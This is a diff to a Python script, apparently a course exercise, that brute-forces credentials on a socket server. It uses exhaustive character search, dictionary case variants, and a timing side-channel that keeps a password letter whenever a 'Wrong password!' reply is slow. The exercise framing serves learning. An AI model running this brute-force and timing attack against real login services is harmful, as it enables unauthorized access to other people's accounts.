@@ -2,6 +2,7 @@ import argparse
 import itertools
 import json
 import string
+from datetime import datetime
 from pathlib import Path
 from socket import socket
 
@@ -28,6 +29,7 @@ class SocketHacker:
         self.send(json.dumps(dict_for_send))
 
     def json_brute_force(self):
+        """ Tasks 4-5 """
         password = ""
         for login in self.logins:
             self.send_json({
@@ -46,15 +48,15 @@ class SocketHacker:
                     "login": login,
                     "password": current_password
                 })
+                start = datetime.now()
                 answer = json.loads(self._receive())
-                if "Exception" in answer["result"]:
+                time_delta = datetime.now() - start
+                if "Wrong password!" in answer["result"] and time_delta.microseconds >= 90000:
                     password = password + letter
                     break
                 elif "Connection success!" in answer["result"]:
-                    # print(answer, password, current_password)
                     return json.dumps({"login": login,
                                        "password": current_password})
-        # print(correct_login)
 
     def _load_file(self, file_name: str):
         full_path = Path(Path.cwd(), file_name)
@@ -62,7 +64,7 @@ class SocketHacker:
             return dict_file.read().split("\n")
 
     def brute_force_with_dictionary(self, file_name="passwords.txt"):
-
+        """ Task 3 """
         self.dictionary = self._load_file(file_name=file_name)
         for word in self.dictionary:
             for password in map(lambda x: ''.join(x),
@@ -74,6 +76,7 @@ class SocketHacker:
                     return password
 
     def brute_force(self):
+        """ Task 2 """
         line = string.ascii_lowercase + string.digits
         for length in range(1, 10):
             for password_var in itertools.product(line, repeat=length):
@@ -122,14 +125,6 @@ def main():
     script_params = parse_params()
     with SocketHacker(connection_params=script_params) as socket_hacker:
         print(socket_hacker.json_brute_force())
-        # socket_hacker.send_json({
-        #     "login": "admin",
-        #     "password": "12345678"
-        # })
-        # print(socket_hacker._receive())
-        # socket_hacker.send(script_params["password"])
-        # socket_hacker.print_message()
-        # print(socket_hacker.brute_force_with_dictionary())
 
 
 if __name__ == '__main__':
